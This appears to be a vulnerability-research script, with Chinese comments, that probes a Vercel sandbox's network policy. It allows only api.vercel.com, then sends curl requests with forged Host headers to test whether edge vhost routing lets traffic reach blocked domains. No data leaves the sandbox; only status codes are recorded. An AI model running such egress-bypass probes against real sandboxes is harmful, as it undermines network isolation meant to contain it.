# -*- coding: utf-8 -*-
"""vhost 路由验证 v3: allow api.vercel.com + Host 伪造 -> 边缘 vhost 路由?
A: Host=nonexist.vercel.app -> 404 (路由生效?)
B: Host=vercel.com -> 200?
C: Host=api.vercel.com 基线 -> 308?
D: Host=www.vercel.com -> 308?
E: h2 :authority 同样测
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

def get_sandbox(name):
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    if d['sandbox'].get('status') != 'running':
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (name, TEAM, PROJ))
        d = json.loads(r)
        sid = d['sandbox']['currentSessionId']
        print('[%s] resumed sid: %s' % (name, sid), flush=True)
        time.sleep(5)
    return sid

def set_policy(sid, body, tag):
    c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), body)
    print('[%s] set_policy http=%d' % (tag, c), flush=True)
    time.sleep(3)

def run(sid, tag, sc):
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=60000)
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    print('[%s] %s' % (tag, out[:300]), flush=True)

sid = get_sandbox('tinj1')
print('sid:', sid, flush=True)

# allow api.vercel.com
set_policy(sid, {"mode": "custom", "allowedDomains": ["api.vercel.com"]}, 'ALLOW-API')

run(sid, 'A-nonexist', 'curl -s -o /dev/null -w "A:%{http_code}\\n" -m 8 --http1.1 https://api.vercel.com/anything -H "Host: nonexist-abc123xyz.vercel.app" 2>&1 | head -2')
run(sid, 'B-vercel', 'curl -s -o /dev/null -w "B:%{http_code}\\n" -m 8 --http1.1 https://api.vercel.com/anything -H "Host: vercel.com" 2>&1 | head -2')
run(sid, 'C-api-base', 'curl -s -o /dev/null -w "C:%{http_code}\\n" -m 8 --http1.1 https://api.vercel.com/anything 2>&1 | head -2')
run(sid, 'D-www', 'curl -s -o /dev/null -w "D:%{http_code}\\n" -m 8 --http1.1 https://api.vercel.com/anything -H "Host: www.vercel.com" 2>&1 | head -2')
run(sid, 'E-vercelapp', 'curl -s -o /dev/null -w "E:%{http_code}\\n" -m 8 --http1.1 https://api.vercel.com/anything -H "Host: vercel.app" 2>&1 | head -2')

print('=== VHOST3 DONE ===', flush=True)
